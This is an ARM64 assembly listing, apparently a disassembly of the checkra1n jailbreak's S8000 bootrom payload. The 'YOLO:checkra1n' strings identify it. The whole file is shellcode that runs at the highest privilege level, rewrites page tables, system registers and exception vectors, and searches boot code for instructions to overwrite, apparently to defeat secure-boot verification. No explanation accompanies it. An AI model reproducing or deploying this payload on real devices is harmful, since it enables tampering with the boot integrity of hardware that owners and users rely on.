// Disassembled using mineekware
// Filename: s8000.bin
// Amount of instructions: 665
// Shellcode binary size: 2660

.align 4
.global _main
_main:

loc_0:
adr x0, #0

loc_4:
adr x1, _end

loc_8:
adr x30, loc_34

loc_c:
dsb sy

loc_10:
dc cvau, x0
add x0, x0, #0x40
cmp x0, x1
b.lo loc_10
dsb sy
isb 
ic iallu
isb 
ret 

loc_34:
	ldr x0, =0x180087958
_find_zero_loop:
	add x0, x0, #1
	ldrb w1, [x0]
	cbnz w1, _find_zero_loop
	adr x1, loc_73c
	ldp x2, x3, [x1]
	stp x2, x3, [x0]
	ldr x0, =0x180087958
	ldr x1, =0x10000E354
	blr x1
	ldr x1, =0x1800807DA
	strb w0, [x1]
	ldr x0, =0x1800C8400
	ldr x1, [x0]
	bic x1, x1, #0xC0
	str x1, [x0]
	dsb sy
	tlbi alle3
	dsb sy
	isb
	mov w2, #0xD2800000
	ldr x3, =0x10000812C
	str w2, [x3]
	orr x1, x1, #0x80
	str x1, [x0]
	dsb sy
	tlbi alle3
	dsb sy
	isb

mov x0, #0x180000000
mov x1, #0x100000000
mov w2, #0x20000
bl loc_44c
mov x0, #0x180000000
movk x0, #0xa61c
mov w1, #-0x29a10000
movk w1, #0x3c0
str w1, [x0]
mov x0, #0x180000000
add x7, x0, #9, lsl #12
mov w1, #-0x6c000000
movk w1, #0x100
str w1, [x7]
mov w1, #0x201f
movk w1, #0xd503, lsl #16
str w1, [x7, #0x38]
str w1, [x7, #0x48]
add x1, x0, #0x20, lsl #12
bl loc_c
mrs x0, ttbr0_el3
mrs x1, tcr_el3
and w1, w1, #0x3f
cmp w1, #0x1c
b.hs loc_a0
ldr x0, [x0]
and x0, x0, #0xfffffffff000

loc_a0:
mov x1, #0x685
orr x1, x1, #0x180000000
str x1, [x0, #0x400]
dsb sy
tlbi alle3
isb 
mov x7, #0x180000000
add x7, x7, #0xe0, lsl #12
add x0, x7, #0x400
adr x1, loc_f0
mov x2, #0x974
bl loc_44c
add x0, x7, #0x400
add x1, x0, #0x974
bl loc_c
mov x8, #0x100000000
movk x8, #0x5ec
mov w0, #4
mov w19, #4
br x8

loc_f0:
mov x25, x0
mov x24, x1
mov x23, x30
mov x22, x29
bl loc_71c
ldr w0, [x25, #0x200]
mov w1, #0x4c4c
movk w1, #0x2042, lsl #16
cmp w0, w1
b.eq loc_148
mov w1, #0x4e69
movk w1, #0x6f6f, lsl #16
str w1, [x25, #0x200]
ldr w0, [x25, #0x208]
mov w1, #0x6567
movk w1, #0x2031, lsl #16
cmp w0, w1
b.eq loc_148
mov x0, x25
bl loc_848
bl loc_8bc
bl loc_948

loc_148:
add x0, x25, #4
mov w1, #0x36000000
movk w1, #8
mov w2, #-0x3ffe1
mov w3, #0x7ff00
mov x5, #-0x1e000000001
movk x5, #0xff80, lsl #16
movk x5, #0x10
mov x6, #0xf2800000
add x7, x6, #0x10
movk x6, #0xb940, lsl #48
movk x6, #8, lsl #32
movk x7, #0xb85f, lsl #48
movk x7, #0xc208, lsl #32

loc_180:
add x0, x0, #4
bl loc_800
cbz x0, loc_3dc
ldur x4, [x0, #-8]
and x4, x4, x5
cmp x4, x6
ccmp x4, x7, #4, ne
b.ne loc_180
mov w4, #0x108
movk w4, #0x3200, lsl #16
str w4, [x0]
sub x0, x0, #4
mov w1, #0
movk w1, #0x9400, lsl #16
mov w2, #0
movk w2, #0xfc00, lsl #16
sub x3, x0, #0x20

loc_1c4:
ldr x4, [x0, #-4]!
and x4, x4, x2
cmp x4, x1
b.eq loc_1e0
cmp x0, x3
b.hi loc_1c4
b loc_3dc

loc_1e0:
mov w2, #-0x2afd0000
movk w2, #0x201f
stp w2, w2, [x0]
mov x0, x25
bl loc_9c0
mov w1, #0x7ff00
add x1, x0, x1
mov w2, #-0x2afd0000
movk w2, #0x201f
add w3, w2, #0x8a0
mov w4, #0x14000000
mov x7, #0x1cc
mov x8, #0

loc_214:
cmp x0, x1
b.hs loc_3dc
ldr w5, [x0]
cmp w5, #0
ccmp w5, w2, #4, ne
ccmp w5, w3, #4, ne
ccmp w5, w4, #4, ne
b.eq loc_23c
add x0, x0, #4
b loc_214

loc_23c:
mov x5, x0

loc_240:
ldr w6, [x5, #4]!
cmp w6, #0
ccmp w6, w2, #4, ne
ccmp w6, w3, #4, ne
ccmp w6, w4, #4, ne
b.eq loc_260
mov x0, x5
b loc_214

loc_260:
sub x6, x5, x0
cmp w6, w7
b.hs loc_270
b loc_240

loc_270:
mov x9, x0
cbnz x8, loc_288
mov x8, x9
mov x0, x5
mov x7, #0x1dc
b loc_214

loc_288:
mov x0, x8
adr x1, loc_458
mov x2, #0x1cc
bl loc_44c
mov x0, x9
adr x1, loc_624
mov x2, #0x1dc
bl loc_44c
add x7, x25, #0x270
stp x8, x9, [x7]
add x0, x25, #0x2a0
mov x8, x0
adr x1, loc_3f8
mov x2, #0x60
bl loc_44c
mov x0, x25
mov w1, #-0x2d800000
movk w1, #0x12
mov w2, #-1
mov w3, #0x7ff00
bl loc_800
cbz x0, loc_3dc
mov w1, #-0x2ae20000
movk w1, #0x1000
mov w2, #-0x20
mov w3, #0x200
bl loc_824
cbz x0, loc_3dc
ldr w1, loc_5c0
mov w2, #-1
mov w3, #0x20
bl loc_800
cbz x0, loc_3dc
add x4, x25, #0x254
ldp w5, w6, [x0, #4]!
stp w5, w6, [x4], #8
ldp w5, w6, [x0, #8]
lsr w7, w6, #0x18
cmp w7, #0x58
b.eq loc_330
stp w5, w6, [x4], #8
b loc_378

loc_330:
str w5, [x4], #4
sbfx w7, w6, #5, #0x13
add x7, x0, w7, sxtw #2
ldur x7, [x7, #0xc]
tst x7, #-0x1000000000000
b.ne loc_3dc
and w6, w6, #0x1f
movk w6, #0xd2c0, lsl #16
ubfx x5, x7, #0x20, #0x10
bfi w6, w5, #5, #0x10
str w6, [x4], #4
movk w6, #0xf2a0, lsl #16
ubfx x5, x7, #0x10, #0x10
bfi w6, w5, #5, #0x10
str w6, [x4], #4
movk w6, #0xf280, lsl #16
bfi w6, w7, #5, #0x10
str w6, [x4], #4

loc_378:
mov w1, #-0x29a10000
movk w1, #0x240
str w1, [x4]
mov w1, #-0x2d400000
movk w1, #0x12
ubfx x5, x8, #0x20, #0x10
bfi w1, w5, #5, #0x10
str w1, [x0]
movk w1, #0xf2a0, lsl #16
ubfx x5, x8, #0x10, #0x10
bfi w1, w5, #5, #0x10
str w1, [x0, #4]
movk w1, #0xf280, lsl #16

loc_3ac:
bfi w1, w8, #5, #0x10
str w1, [x0, #8]
mov w1, #-0x29c10000
movk w1, #0x240
str w1, [x0, #0xc]
mov x0, x25
mov x1, x24

loc_3c8:
mov x30, x23
mov x29, x22

loc_3d0:
dsb sy
msr daifset, #0xf
ret 

loc_3dc:
mov x8, #0x200000000
movk x8, #0x102b, lsl #16
movk x8, #0xc000
ldr w0, [x8]
and w0, w0, #0xfffffffe
str w0, [x8]

loc_3f4:
b loc_3f4

loc_3f8:
mov x18, x30
and x0, x30, #0xfffffffffffff000
add x0, x0, #0xbc0
ldr w1, loc_454

loc_408:
ldr w2, [x30, #4]!
cmp w2, w1
b.ne loc_408
sub x4, x0, x30
mov w2, #0x14000000
bfxil w2, w4, #2, #0x1a
str w2, [x30]
ldr x1, loc_3c8
mov x2, #0x1cc
bl loc_44c
ldr x1, loc_3d0
mov x2, #0x1dc
bl loc_44c
dsb sy
b loc_3ac

loc_444:
ldr w4, [x1], #4
str w4, [x0], #4

loc_44c:
subs w2, w2, #4
b.hs loc_444

loc_454:
ret 

loc_458:
msr daifset, #0xf
mov x28, x30
mov x27, x0
mov x8, #0x200000000
movk x8, #0x102b, lsl #16
movk x8, #0
str wzr, [x8, #0xc]
str wzr, [x8, #0x1c]
ldr x8, loc_798
msr vbar_el3, x8
adr x0, loc_4c4
mov x1, #0x100000000
movk x1, #0x800f, lsl #16
movk x1, #0xc000
add x2, x1, #4, lsl #12
cmp x0, x1
ccmp x0, x2, #2, hs
b.lo loc_4c4
add x1, x1, #0x6c
add x2, x1, #0x33c
mov x3, x1

loc_4ac:
ldr w4, [x0], #4
str w4, [x1], #4
cmp x1, x2
b.lo loc_4ac
bl loc_6a4
br x3

loc_4c4:
ldr x0, loc_768
ldr x1, loc_770
mov w2, #0x840
bl loc_6b8
mov w2, #0x7b30
bl loc_6cc
ldr x0, loc_778
msr spsel, #1
mov sp, x0
add x0, x0, #2, lsl #12
msr spsel, #0
mov sp, x0
add x0, x0, #2, lsl #12
ldr x8, loc_780
str x0, [x8]
msr daifclr, #4
ic iallu
ldr x9, loc_788
mov x7, #0x60000000000000
movk x7, #0x421
mov x1, x9
mov w2, #0x8000
bl loc_6cc
mov x8, x9
mov x0, #0x100000000
mov w1, #0x20000
movk x0, #0x685
bl loc_6ec
mov x0, #0x200000000
mov w1, #0x20000000
orr x0, x0, x7
bl loc_6ec
mov x0, #0x600000000
mov w1, #0x20000000
orr x0, x0, x7
bl loc_6ec
mov x0, #0x700000000
movk x0, #0xc000, lsl #16
mov w1, #0x2000000
orr x0, x0, x7
bl loc_6ec
add x8, x9, #4, lsl #12
orr x0, x8, #3
str x0, [x9, #0x600]
mov x0, #0x180000000
mov w1, #0x400000
movk x0, #0x607
bl loc_6dc
dsb sy
mov w0, #0xff04
msr mair_el3, x0
msr ttbr0_el3, x9
mov w0, #0x10000
movk w0, #0xa51c
msr tcr_el3, x0
tlbi alle3
isb 
mov w0, #0xe
msr scr_el3, x0
mov w8, #0x100d
mrs x0, sctlr_el3
orr x0, x0, x8
msr sctlr_el3, x0

loc_5c0:
isb 
ldr x8, loc_7a8
ldr x0, loc_7a0
mov w1, #0x100000
movk w1, #0
mov w2, #1
blr x8
adr x19, loc_7b0
adr x20, loc_7d8

loc_5e4:
ldr x8, [x19], #8
mov w0, #0
blr x8
cmp x19, x20
b.lo loc_5e4
ldr x8, loc_7e0
mov w0, #1
blr x8
adr x0, loc_73c
ldr x1, loc_7e8
mov x2, #0xf

loc_610:
ldrb w3, [x0], #1
strb w3, [x1], #1
sub w2, w2, #1
cbnz w2, loc_610
adr x0, loc_74b

loc_624:
ldr x1, loc_7f0
mov x2, #0x1d

loc_62c:
ldrb w3, [x0], #1
strb w3, [x1], #1
sub w2, w2, #1
cbnz w2, loc_62c
mov w0, #2
ldr x1, loc_7f8
str w0, [x1]
ldr x8, loc_7d8
ldr x0, loc_790
mov x1, #0x80000
blr x8
bl loc_71c
dsb sy
ldr x0, loc_790
add x1, x0, #0x80, lsl #12

loc_668:
dc cvau, x0
add x0, x0, #0x40
cmp x0, x1
b.lo loc_668
bl loc_6a4
msr daifset, #0xf
msr spsel, #1
and sp, xzr, #1
msr sp_el0, xzr
msr vbar_el3, xzr
isb 
mov x30, x28
mov x0, x27
ldr x8, loc_790
br x8

loc_6a4:
dsb sy
isb 
ic iallu
isb 
ret 

loc_6b8:
ldp x3, x4, [x0], #0x10
stp x3, x4, [x1], #0x10
subs w2, w2, #0x10
b.hi loc_6b8
ret 

loc_6cc:
stp xzr, xzr, [x1], #0x10
subs w2, w2, #0x10
b.hi loc_6cc
ret 

loc_6dc:
lsr x4, x0, #0xb
lsr x1, x1, #0xe
mov w3, #0x4000
b loc_6f8

loc_6ec:
lsr x4, x0, #0x16
lsr x1, x1, #0x19
mov w3, #0x2000000

loc_6f8:
and x4, x4, #0x3ff8
add x4, x4, x8
mov w2, #0

loc_704:
str x0, [x4, w2, uxtw #3]
add x0, x0, x3
add w2, w2, #1
cmp w2, w1
b.lo loc_704
ret 

loc_71c:
mov x1, #0x200000000
movk x1, #0xf10, lsl #16
movk x1, #0x220
ldr w0, [x1]
and w0, w0, #0xfffffffc
str w0, [x1]
ret 
nop 

loc_73c:
.asciz "YOLO:checkra1n"
loc_74b:
.asciz "GANG:KJC HAXX:Axi0mX ETA:son"

loc_768:
// .byte 0x00, 0x90, 0x01, 0x00
// udf #1
.dword 0x100019000

loc_770:
// .byte 0x00, 0x00, 0x08, 0x80
// udf #1
.dword 0x180080000

loc_778:
// .byte 0x00, 0x10, 0x0c, 0x80
// udf #1
.dword 0x1800c1000

loc_780:
// .byte 0x00, 0x02, 0x08, 0x80
// udf #1
.dword 0x180080200

loc_788:
// .byte 0x00, 0x80, 0x0c, 0x80
// udf #1
.dword 0x1800c8000

loc_790:
// .byte 0x00, 0x00, 0x38, 0x80
// udf #1
.dword 0x180380000

loc_798:
// udf #0xd000
// udf #1
.dword 0x10000d000

loc_7a0:
// .byte 0x00, 0x00, 0x10, 0x80
// udf #1
.dword 0x180100000

loc_7a8:
// udf #0x7044
// udf #1
.dword 0x100007044

loc_7b0:
// udf #0xc324
// udf #1
// udf #0xb9d0
// udf #1
// udf #0x1cf0
// udf #1
// udf #0x1174
// udf #1
// udf #0xc9cc
// udf #1
.dword 0x10000c324
.dword 0x10000b9d0
.dword 0x100001cf0
.dword 0x100001174
.dword 0x10000c9cc

loc_7d8:
// udf #0xf084
// udf #1
.dword 0x10000f084

loc_7e0:
// .byte 0x68, 0x02, 0x01, 0x00
// udf #1
.dword 0x100010268

loc_7e8:
// .byte 0xa0, 0x79, 0x08, 0x80
// udf #1
.dword 0x1800879a0

loc_7f0:
// .byte 0xd7, 0x79, 0x08, 0x80
// udf #1
.dword 0x1800879d7

loc_7f8:
// .byte 0x54, 0x79, 0x08, 0x80
// udf #1
.dword 0x180087954

loc_800:
ldr w4, [x0]
and w4, w4, w2
cmp w4, w1
b.eq loc_820
add x0, x0, #4
sub w3, w3, #4
cbnz w3, loc_800
mov x0, xzr

loc_820:
ret 

loc_824:
ldr w4, [x0]
and w4, w4, w2
cmp w4, w1
b.eq loc_844
sub x0, x0, #4
sub w3, w3, #4
cbnz w3, loc_824
mov x0, xzr

loc_844:
ret 

loc_848:
mov x2, x0
mov w5, #-0x6d8b0000
movk w5, #0xd000
mov w6, #-0x4dc00000
mov w7, #-0x55e10000
mov w8, #0x2a010000
movk w8, #0x3e0

loc_864:
ldr w3, [x2], #4
and w4, w3, #0xffffffe0
cmp w4, w5
b.ne loc_864
bfi w6, w3, #5, #5
ldr w4, [x2]
and w3, w4, #0xffffffe0
cmp w3, w6
b.eq loc_8b0
cmp w3, w8
b.ne loc_864
and w9, w6, #0x3e0
movk w9, #0xaa00, lsl #16
bfi w9, w4, #0x10, #5
ldr w4, [x2, #4]
and w3, w4, #0xffffffe0
cmp w3, w9
b.ne loc_864
add x2, x2, #4

loc_8b0:
bfxil w7, w4, #0, #0xa
str w7, [x2]
ret 

loc_8bc:
mov x2, x0
mov w7, #0x320e0000
movk w7, #0x3e0
mov w8, #0x52a00000
movk w8, #0x80
mov w9, #-0x56000000
movk w9, #0x3f0
sub w10, w7, #0x10, lsl #12
add w11, w8, #0x80

loc_8e0:
ldr w3, [x2], #4
cmp w3, w7
ccmp w3, w8, #4, ne
b.ne loc_8e0
ldp w3, w4, [x2, #4]
and w3, w3, #0xfffffff0
cmp w4, w10
ccmp w4, w11, #4, ne
ccmp w3, w9, #0, eq
b.ne loc_8e0
ldr w3, [x2]
ldr w4, [x2, #0xc]
sub w3, w3, w4
lsr w4, w4, #0x1a
cmp w4, #0x25
ccmp w3, #3, #0, eq
b.ne loc_8e0
add x2, x2, #0xc

loc_928:
ldr w3, [x2, #4]!
lsr w4, w3, #0x1a
cmp w4, #0x25
b.ne loc_928
sbfx w3, w3, #0, #0x1a
ldr w7, loc_944
str w7, [x2, w3, sxtw #2]

loc_944:
ret 

loc_948:
mov x2, x0
mov w8, #0x32000000
movk w8, #0x7e0
mov w9, #0x52800000
movk w9, #0x60
mov w10, #0x25

loc_960:
ldr w3, [x2], #4
cmp w3, w8
ccmp w3, w9, #4, ne
b.ne loc_960
ldp w3, w4, [x2]
ldp w5, w6, [x2, #8]
ldr w7, [x2, #0x10]
lsr w3, w3, #0x1a
lsr w5, w5, #0x1a
cmp w4, w8
ccmp w4, w9, #4, ne
b.ne loc_960
cmp w6, w8
ccmp w6, w9, #4, ne
lsr w4, w7, #0x1a
ccmp w3, w10, #0, eq
ccmp w5, w10, #0, eq
ccmp w4, w10, #0, eq
b.ne loc_960
add x2, x2, #0x10
sbfx w7, w7, #0, #0x1a
ldr w3, loc_9bc
str w3, [x2, w7, sxtw #2]

loc_9bc:
ret 

loc_9c0:
mov x2, x0
mov w3, #-0x46c00000
movk w3, #0x109
mov w4, #0x32010000
movk w4, #0x129
mov w5, #-0x47000000
movk w5, #0x109
mov w6, #-0x2afd0000
movk w6, #0x3f9f
mov w7, #-0x29a10000
movk w7, #0x3c0
mov w8, #-0xd800000
movk w8, #8
mov w9, #0x34000000

loc_9f8:
ldp w10, w11, [x2, #4]!
cmp w10, w3
ccmp w11, w4, #0, eq
b.ne loc_9f8
ldp w10, w11, [x2, #8]
cmp w11, w6
ccmp w11, w7, #4, ne
ccmp w10, w5, #0, eq
b.ne loc_9f8
ldur w10, [x2, #-4]
and w10, w10, #0xff80001f
cmp w10, w8
b.ne loc_9f8
sub x10, x2, #4
sub x11, x10, #0x18

loc_a34:
ldr w12, [x10, #-4]!
and w13, w12, #0xff80001f
cmp w13, w9
b.eq loc_a50
cmp x10, x11
b.hi loc_a34
b loc_9f8

loc_a50:
sbfx w12, w12, #5, #0x13
mov w8, #0x14000000
bfxil w8, w12, #0, #0x1a
str w8, [x10]
ret 

_end:
